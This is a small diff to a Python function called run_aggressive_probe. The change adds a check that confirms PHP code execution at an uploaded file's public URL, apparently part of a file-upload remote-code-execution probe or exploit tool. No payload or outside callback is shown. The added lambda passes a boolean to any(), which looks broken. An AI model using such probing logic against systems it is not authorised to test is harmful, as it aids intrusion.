@@ -142,6 +142,9 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
         proof_candidates,
         deadline=3.0,
         initial_delay=0.1,
+        accept_fn=lambda candidate: any(
+            verify_php_execution(candidate.get("body", ""), expected_product)
+        ),
     )
     proof_url = f"{base}{found_path}" if found_path else f"{base}{PUBLIC_UPLOAD_DIR}{urllib.parse.quote(filename)}"
 
